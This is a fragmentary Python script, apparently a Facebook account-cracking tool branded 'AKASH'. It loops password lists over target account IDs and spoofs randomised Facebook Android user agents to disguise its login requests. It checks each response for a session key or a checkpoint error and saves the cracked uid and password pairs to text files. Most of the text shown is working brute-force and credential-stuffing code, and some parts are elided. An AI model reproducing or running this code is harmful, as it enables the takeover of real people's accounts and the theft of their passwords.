...
def ex():
	ua= '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randrange(9,99))+str(random.randint(111,999)) +';FBBV/'+str(random.randint(111111111,999999999))+';[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/528873364;FBDM/{density=1.49,width=1280,height=800};FBLC/en_GB;FBRV/215203224;FBCR/ZONG;FBMF/Sumsung;FBBD/Sumsung;FBPN/com.facebook.mlite;FBDV/SM-T530;FBSV/4.4.2;FBOP/1;FBCA/arm64-v8a:;]'
...
xxxx='[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randrange(9,99))+str(random.randint(111,999)) +';FBBV/'+str(random.randint(111111111,999999999))+";[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/528873364;FBDM/{density=1.49,width=1280,height=800};FBLC/en_GB;FBRV/215203224;FBCR/ZONG;FBMF/Sumsung;FBBD/Sumsung;FBPN/com.facebook.mlite;FBDV/SM-T530;FBSV/4.4.2;FBOP/1;FBCA/arm64-v8a:;]"+"[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/351.0.0.4.20;FBBV/429669907;FBDM/{density=3.0,width=1080,height=1280};FBLC/en_US;FBRV/249098872;FBCR/Zong;FBMF/samsung;FBBD/oppo;FBPN/com.facebook.katana;FBDV/samsong-414XOP;FBSV/3.0;FBOP/1;FBCA/asfuck-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/179.0.0.6.101;FBBV/890259801;FBDM/{density=3.5,width=1480,height=1482};FBLC/en_US;FBRV/159803185;FBCR/Telnor;FBMF/samsung;FBBD/Tecno;FBPN/com.facebook.katana;FBDV/samsong-414XOP;FBSV/8.0.10;FBOP/1;FBCA/armeabi-v7a;]"+"[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/443.0.0.8.99;FBBV/134591062;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/173641308;FBCR/Robi;FBMF/POSH;FBBD/POSH;FBPN/com.facebook.katana;FBDV/Memopro LTE L600;FBSV/9.0.1;nullFBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/51.0.0.9.141;FBBV/147430276;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/122333214;FBCR/Zong;FBMF/samsung;FBBD/Telenor;FBPN/com.facebook.katana;FBDV/somsong-414XOP;FBSV/8.0.10;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/89.0.0.2.89;FBBV/744398544;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/506956632;FBCR/Robi;FBMF/samsung;FBBD/oppo;FBPN/com.facebook.katana;FBDV/Hawavi-414XOP;FBSV/8.0.1;FBOP/1;FBCA/armeabi-v7a:;]"
...
{R}--------------------------------------------------
{R}❲{G}~{R}❳{G} DEVELOPER {R}:{G} Noman Saleem
...
def rd1(ids,passlist):
	try:
		...
		for pas in passlist:
				...
				ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+"Mozilla/5.0 (Linux; Android 7.0; QMobile i8i PRO Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.111 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.16.72;]"+"Mozilla/5.0 (Linux; Android 7.0; QMobile i8i PRO Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/433.0.0.31.111;]"+"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/528873364;FBDM/{density=1.49,width=1280,height=800};FBLC/en_GB;FBRV/215203224;FBCR/ZONG;FBMF/Sumsung;FBBD/Sumsung;FBPN/com.facebook.mlite;FBDV/SM-T530;FBSV/4.4.2;FBOP/1;FBCA/arm64-v8a:;]"+"[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/351.0.0.4.20;FBBV/429669907;FBDM/{density=3.0,width=1080,height=1280};FBLC/en_US;FBRV/249098872;FBCR/Zong;FBMF/samsung;FBBD/oppo;FBPN/com.facebook.katana;FBDV/samsong-414XOP;FBSV/3.0;FBOP/1;FBCA/asfuck-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/179.0.0.6.101;FBBV/890259801;FBDM/{density=3.5,width=1480,height=1482};FBLC/en_US;FBRV/159803185;FBCR/Telnor;FBMF/samsung;FBBD/Tecno;FBPN/com.facebook.katana;FBDV/samsong-414XOP;FBSV/8.0.10;FBOP/1;FBCA/armeabi-v7a;]"+"[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/443.0.0.8.99;FBBV/134591062;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/173641308;FBCR/Robi;FBMF/POSH;FBBD/POSH;FBPN/com.facebook.katana;FBDV/Memopro LTE L600;FBSV/9.0.1;nullFBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/51.0.0.9.141;FBBV/147430276;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/122333214;FBCR/Zong;FBMF/samsung;FBBD/Telenor;FBPN/com.facebook.katana;FBDV/somsong-414XOP;FBSV/8.0.10;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/89.0.0.2.89;FBBV/744398544;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/506956632;FBCR/Robi;FBMF/samsung;FBBD/oppo;FBPN/com.facebook.katana;FBDV/Hawavi-414XOP;FBSV/8.0.1;FBOP/1;FBCA/armeabi-v7a:;]"
				...
				if 'session_key' in po:
						...
						print('\r\r\x1b[38;5;46m(=)~(AKASH-OK) '+uid+' | '+pas+'\033[1;97m')
						#print(f'\r\033[1;32[Account Create Date] '+_bristy_(uid)+' \ [Date Of Birth]' +getDOB(cookie)+' '+'\033[1;92m')
						file_path = os.path.join(folder_path, 'AKASH-CP.txt')
...
def api2(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\33[1;37m[=]~[AKASH-M1]~[%s]~[OK|CP]~[%s|0]\033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
					uid = str(po['uid'])
					print('\r\r\033[1;32m[=]~[M1]~[AKASH-OK] '+uid+' | '+pas)
					file_path = os.path.join(folder_path, 'AKASH_FILE_OK.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					oks.append(uid)
					break
					...
					uid = str(po['error']['error_data']['uid'])
					print(f'\r\r\33[1m\33[1;35m[=]~[M1]~[AKASH-CP] '+uid+' | '+pas+'\033[1;97m')
					file_path = os.path.join(folder_path, 'AKASH-CP.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					cps.append(uid)
